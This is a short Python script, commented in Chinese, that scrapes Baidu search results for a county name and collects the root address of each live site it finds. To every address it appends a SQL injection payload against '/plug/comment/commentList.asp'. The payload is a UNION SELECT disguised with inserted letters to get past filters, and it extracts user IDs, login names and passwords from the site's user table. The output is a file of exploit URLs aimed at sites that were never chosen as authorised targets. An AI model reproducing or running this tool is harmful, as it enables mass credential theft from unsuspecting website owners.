import requests
from bs4 import BeautifulSoup as bs
import re
def main():
    for i in range(100,1000,10):
        expp='/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user'
        url='https://www.baidu.com/s?wd=新建县&pn=%s'%(str(i))
        headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'}
        r=requests.get(url=url,headers=headers)
        soup=bs(r.content,'lxml')
        urls=soup.find_all(name='a',attrs={'data-click':re.compile(('.')),'class':None})#利用bs取出我们想要的内容，re模块是为了让我们取出这个标签的所有内容。
        for url in urls:
            try:
                r_get_url=requests.get(url=url['href'],headers=headers,timeout=4)#请求抓取的链接，并设置超时时间为4秒。
                if r_get_url.status_code==200:#判断状态码是否为200
                    url_para= r_get_url.url#获取状态码为200的链接
                    url_index_tmp=url_para.split('/')#以“/”分割url
                    url_index=url_index_tmp[0]+'//'+url_index_tmp[2]#将分割后的网址重新拼凑成标准的格式。
                    with open('cs.txt') as f:
                        if url_index not in f.read():
                            print(url_index)
                            f2=open('cs.txt','a+')
                            f2.write(url_index+expp+'\n')
                            f2.close()
            except:
                continue
if __name__=='__main__':
    f2=open('cs.txt','w')
    f2.close()
    main()